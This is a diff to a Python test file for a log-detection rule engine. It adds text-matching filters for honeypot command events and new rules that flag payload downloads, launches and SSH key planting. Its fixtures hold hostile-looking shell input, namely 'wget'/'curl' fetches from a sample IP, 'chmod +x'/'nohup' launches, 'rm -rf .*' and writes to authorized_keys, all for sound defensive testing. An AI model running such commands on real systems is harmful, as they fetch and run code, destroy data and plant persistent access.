@@ -1,17 +1,19 @@
 import os
 import tempfile
 import unittest
-from datetime import timedelta
+from datetime import datetime, timedelta, timezone
 
 from siftlog.engine import (
     EVENT_COUNT,
     IMPOSSIBLE_TRAVEL,
     TEMPORAL_ORDERED,
     VALUE_COUNT,
+    Condition,
     RuleError,
     load_rules,
     parse_rule,
 )
+from siftlog.events import Event
 
 RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "rules")
 
@@ -127,6 +129,175 @@ def travel(**overrides):
     return rule
 
 
+def command(text, **overrides):
+    """A honeypot command event. ``text`` is what the visitor typed."""
+    fields = dict(
+        id="e1", timestamp=datetime(2026, 10, 12, 10, 0, tzinfo=timezone.utc), source="cowrie", event_type="command",
+        src_ip="198.51.100.7", username=None, host="honeypot01", outcome=None, raw="{}",
+        extra={"input": text, "session": "0a1b2c3d4e5f", "dst_port": 2222},
+    )  # fmt: skip
+    fields.update(overrides)
+    return Event(**fields)
+
+
+class TextMatchTests(unittest.TestCase):
+    """Filters that look inside text, and at source-specific detail (stage 9)."""
+
+    def rule(self, **overrides):
+        overrides.setdefault("filter", {"event_type": "command"})
+        overrides.setdefault("condition", {"gte": 1})
+        return parse_rule(base(**overrides))
+
+    def test_text_tests_are_kept_apart_from_plain_equality(self):
+        rule = self.rule(filter={"event_type": "command", "extra.input|contains": ["wget", "CURL "]})
+        self.assertEqual(rule.filter, {"event_type": ("command",)})  # unchanged: still a dictionary lookup
+        self.assertEqual(rule.where, (Condition("extra.input", "contains", ("wget", "curl "), False),))
+        self.assertEqual(self.rule().where, ())
+        self.assertEqual(self.rule().exclude, ())
+
+    def test_contains_matches_any_value_and_ignores_case(self):
+        rule = self.rule(filter={"extra.input|contains": ["wget ", "curl "]})
+        self.assertTrue(rule.matches(command("cd /tmp; wget http://203.0.113.200/x")))
+        self.assertTrue(rule.matches(command("CURL -s http://203.0.113.200/x")))
+        self.assertFalse(rule.matches(command("uname -a")))
+        self.assertFalse(rule.matches(command("wget")))  # the rule asked for "wget " with a space
+
+    def test_all_requires_every_value(self):
+        rule = self.rule(filter={"extra.input|contains|all": ["chmod +x", "nohup"]})
+        self.assertTrue(rule.matches(command("chmod +x ./a; nohup ./a &")))
+        self.assertFalse(rule.matches(command("chmod +x ./a")))
+        self.assertFalse(rule.matches(command("nohup ./a &")))
+
+    def test_startswith_and_endswith(self):
+        starts = self.rule(filter={"extra.input|startswith": "cd /tmp"})
+        self.assertTrue(starts.matches(command("CD /TMP && ls")))
+        self.assertFalse(starts.matches(command("ls; cd /tmp")))
+        ends = self.rule(filter={"extra.destfile|endswith": "/.ssh/authorized_keys"})
+        self.assertTrue(ends.matches(command("x", extra={"destfile": "/root/.ssh/authorized_keys"})))
+        self.assertFalse(ends.matches(command("x", extra={"destfile": "/root/.ssh/authorized_keys.bak"})))
+
+    def test_text_tests_work_on_event_fields_too(self):
+        rule = self.rule(filter={"username|startswith": "svc-", "source": "cowrie"})
+        self.assertEqual(rule.filter, {"source": ("cowrie",)})
+        self.assertTrue(rule.matches(command("x", username="SVC-backup")))
+        self.assertFalse(rule.matches(command("x", username="root")))
+        self.assertFalse(rule.matches(command("x", username=None)))  # no username: nothing to test
+
+    def test_plain_equality_on_an_extra_field_is_exact(self):
+        rule = self.rule(filter={"extra.input": ["uname -a", "id"]})
+        self.assertEqual(rule.where, (Condition("extra.input", "equals", ("uname -a", "id"), False),))
+        self.assertTrue(rule.matches(command("uname -a")))
+        self.assertFalse(rule.matches(command("UNAME -A")))  # equality does not ignore case
+        self.assertFalse(rule.matches(command("uname -a; wget http://203.0.113.200/x")))
+        self.assertFalse(rule.matches(command(" uname -a")))
+
+    def test_a_number_in_the_log_equals_the_same_number_in_the_rule(self):
+        rule = self.rule(filter={"extra.dst_port": 2222})
+        self.assertTrue(rule.matches(command("x")))
+        self.assertFalse(self.rule(filter={"extra.dst_port": 22}).matches(command("x")))
+        self.assertFalse(self.rule(filter={"extra.flag": "True"}).matches(command("x", extra={"flag": True})))
+
+    def test_a_missing_or_non_text_field_never_matches(self):
+        for extra in ({}, {"input": None}, {"input": 7}, {"input": ["wget x"]}, {"input": {"a": "wget x"}}):
+            with self.subTest(extra=extra):
+                event = command("ignored", extra=extra)
+                self.assertFalse(self.rule(filter={"extra.input|contains": "wget"}).matches(event))
+                self.assertFalse(self.rule(filter={"extra.input": "wget x"}).matches(event))
+
+    def test_every_line_of_a_filter_must_hold(self):
+        rule = self.rule(filter={"event_type": "command", "extra.input|contains": "wget", "extra.input|endswith": ".sh"})
+        self.assertEqual(len(rule.where), 2)
+        self.assertTrue(rule.matches(command("wget http://203.0.113.200/a.sh")))
+        self.assertFalse(rule.matches(command("wget http://203.0.113.200/a.bin")))
+        self.assertFalse(rule.matches(command("wget http://203.0.113.200/a.sh", event_type="auth_success")))
+
+    def test_exclude_removes_events_that_match_a_whole_block(self):
+        rule = self.rule(exclude={"extra.input": ["uname -a", "id"]})
+        self.assertEqual(rule.exclude, ((Condition("extra.input", "equals", ("uname -a", "id"), False),),))
+        self.assertFalse(rule.matches(command("uname -a")))
+        self.assertFalse(rule.matches(command("id")))
+        self.assertTrue(rule.matches(command("uname -a; id")))
+
+        both = self.rule(exclude={"extra.input|startswith": "echo ", "username": "monitor"})
+        self.assertFalse(both.matches(command("echo ok", username="monitor")))
+        self.assertTrue(both.matches(command("echo ok", username="root")))  # only one line of the block holds
+        self.assertTrue(both.matches(command("ls", username="monitor")))
+
+    def test_exclude_takes_a_list_of_blocks_and_any_one_is_enough(self):
+        rule = self.rule(exclude=[{"extra.input": "uname -a"}, {"src_ip": "198.51.100.99"}])
+        self.assertEqual(len(rule.exclude), 2)
+        self.assertFalse(rule.matches(command("uname -a")))
+        self.assertFalse(rule.matches(command("ls", src_ip="198.51.100.99")))
+        self.assertTrue(rule.matches(command("ls")))
+
+    def test_steps_can_use_text_tests(self):
+        steps = [{"filter": {"event_type": "auth_success"}},
+                 {"filter": {"event_type": "command", "extra.input|contains": "authorized_keys"}}]  # fmt: skip
+        rule = parse_rule(sequence(steps=steps, exclude={"username": "backup"}))
+        self.assertEqual(rule.steps[1].where, (Condition("extra.input", "contains", ("authorized_keys",), False),))
+        self.assertTrue(rule.steps[1].matches(command("cat .ssh/authorized_keys")))
+        self.assertFalse(rule.steps[1].matches(command("ls")))
+        self.assertFalse(rule.steps[0].matches(command("cat .ssh/authorized_keys")))
+        only_text = [steps[0], {"filter": {"extra.input|contains": "x"}}]
+        self.assertEqual(parse_rule(sequence(steps=only_text)).steps[1].filter, {})  # a step may be text tests alone
+
+    def test_hostile_text_is_only_ever_compared(self):
+        # The command is whatever an attacker typed. It must not be able to act as a pattern.
+        rule = self.rule(filter={"extra.input|contains": "a.c"})
+        self.assertFalse(rule.matches(command("abc")))  # "." is a dot, not "any character"
+        self.assertTrue(rule.matches(command("x a.c y")))
+        star = self.rule(filter={"extra.input|contains": ".*"})
+        self.assertFalse(star.matches(command("anything at all")))
+        self.assertTrue(star.matches(command("rm -rf .*")))
+        long = "a" * 4096 + "!"
+        self.assertFalse(self.rule(filter={"extra.input|endswith": "a"}).matches(command(long)))
+
+    def test_malformed_text_tests_are_rejected_with_a_reason(self):
+        cases = [
+            ({"extra.input|matches": "x"}, "unknown modifier"),
+            ({"extra.input|re": "x.*"}, "unknown modifier"),  # no regular expressions, on purpose
+            ({"extra.input|all": ["a", "b"]}, "unknown modifier"),  # |all needs a text test before it
+            ({"extra.input|all|contains": ["a", "b"]}, "unknown modifier"),
+            ({"extra.input|contains|startswith": "a"}, "unknown modifier"),
+            ({"extra.input|": "a"}, "unknown modifier"),
+            ({"extra.input|contains": ""}, "non-empty text"),  # "" is inside everything
+            ({"extra.input|contains": ["wget", ""]}, "non-empty text"),
+            ({"extra.input|contains": True}, "non-empty text"),
+            ({"extra.input|contains": []}, "non-empty list"),
+            ({"extra.input|contains": {"a": 1}}, "non-empty list"),
+            ({"extra.input|contains": None}, "non-empty list"),
+            ({"extras.input": "x"}, "unknown field 'extras.input'"),
+            ({"extra.": "x"}, "unknown field"),
+            ({"extra.in-put": "x"}, "unknown field"),
+            ({"extra.a.b": "x"}, "unknown field"),
+            ({"|contains": "x"}, "unknown field ''"),
+            ({"input|contains": "x"}, "extra.<name>"),  # the message says how to reach source-specific fields
+            ({7: "x"}, "unknown field"),
+        ]
+        for bad, reason in cases:
+            with self.subTest(filter=bad), self.assertRaisesRegex(RuleError, reason):
+                self.rule(filter=bad)
+            with self.subTest(exclude=bad), self.assertRaisesRegex(RuleError, reason):
+                self.rule(exclude=bad)
+
+    def test_malformed_exclude_is_rejected(self):
+        for bad, reason in (({}, "must not be empty"), ([], "exclude must be"), ("uname", "must be a mapping"),
+                            ([{"extra.input": "a"}, {}], r"exclude\[2\] must not be empty"),
+                            ([{"extra.input": "a"}, "b"], r"exclude\[2\] must be a mapping")):  # fmt: skip
+            with self.subTest(exclude=bad), self.assertRaisesRegex(RuleError, reason):
+                self.rule(exclude=bad)
+
+    def test_extra_fields_cannot_group_or_be_counted(self):
+        with self.assertRaisesRegex(RuleError, "extra fields can be used in filter and exclude only"):
+            self.rule(group_by=["extra.session"])
+        with self.assertRaisesRegex(RuleError, "extra fields can be used in filter and exclude only"):
+            self.rule(type="value_count", distinct="extra.password")
+
+    def test_which_sources_a_rule_reads_is_unaffected_by_text_tests(self):
+        rule = self.rule(filter={"source": "cowrie", "extra.input|contains": "wget"}, exclude={"source": "sshd"})
+        self.assertEqual((rule.reads("cowrie"), rule.reads("sshd")), (True, False))
+
+
 class NewRuleTypeTests(unittest.TestCase):
     def test_temporal_ordered_steps(self):
         rule = parse_rule(sequence(filter={"source": "sshd"}))
@@ -210,12 +381,23 @@ class LoadTests(unittest.TestCase):
             "ssh-brute-force", "ssh-password-spray", "ssh-credential-stuffing",
             "ssh-success-after-failures", "ssh-impossible-travel",
             "honeypot-file-transfer", "honeypot-shell-commands", "honeypot-credential-sweep",
+            "honeypot-ssh-key-planted", "honeypot-payload-launch",
         })  # fmt: skip
         # Every shipped rule names the source it reads, so sshd rules and honeypot rules never mix.
         self.assertEqual({rule.id.split("-")[0]: rule.filter["source"] for rule in rules.values()},
                          {"ssh": ("sshd",), "honeypot": ("cowrie",)})
         self.assertEqual(sorted(r.id for r in rules.values() if r.reads("cowrie")),
-                         ["honeypot-credential-sweep", "honeypot-file-transfer", "honeypot-shell-commands"])
+                         ["honeypot-credential-sweep", "honeypot-file-transfer", "honeypot-payload-launch",
+                          "honeypot-shell-commands", "honeypot-ssh-key-planted"])  # fmt: skip
+        # The ssh rules use none of the stage 9 syntax, so the published results cannot have moved.
+        self.assertTrue(all(not (r.where or r.exclude) for r in rules.values() if r.id.startswith("ssh-")))
+        self.assertEqual(rules["honeypot-shell-commands"].exclude,
+                         ((Condition("extra.input", "equals", ("uname -a", "uname -s -v -n -r -m"), False),),))
+        # Only command events carry typed text today. Saying so in the rule keeps it true if that changes.
+        for rule_id in ("honeypot-ssh-key-planted", "honeypot-payload-launch", "honeypot-shell-commands"):
+            self.assertEqual(rules[rule_id].filter, {"source": ("cowrie",), "event_type": ("command",)}, rule_id)
+        self.assertEqual(rules["honeypot-payload-launch"].where,
+                         (Condition("extra.input", "contains", ("chmod +x", "nohup "), False),))
         sequence, travel = rules["ssh-success-after-failures"], rules["ssh-impossible-travel"]
         self.assertEqual((sequence.type, sequence.group_by), (TEMPORAL_ORDERED, ("src_ip", "username")))
         self.assertEqual([(s.filter["event_type"], s.threshold) for s in sequence.steps],
